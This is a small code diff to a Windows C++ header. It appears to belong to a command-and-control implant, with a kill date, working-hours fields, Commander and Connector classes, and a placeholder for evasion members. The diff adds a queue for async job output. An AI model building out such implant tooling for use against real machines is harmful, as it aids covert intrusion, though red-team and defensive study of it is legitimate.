@@ -10,6 +10,9 @@
 #endif
 #include <windows.h>
 
+#include <vector>
+#include <stdint.h>
+
 // Forward declarations
 class Commander;
 class Connector;
@@ -33,6 +36,9 @@ public:
     INT64   killDate  = 0;       // unix timestamp; 0 = disabled
     int     workStart = 0;       // HHMM e.g. 900
     int     workEnd   = 0;       // HHMM e.g. 1700
+
+    // Pending type-2 (job) output messages queued by async commands.
+    std::vector<std::vector<uint8_t>> pendingJobOutput;
 
     // __EVASION_MEMBER__
 
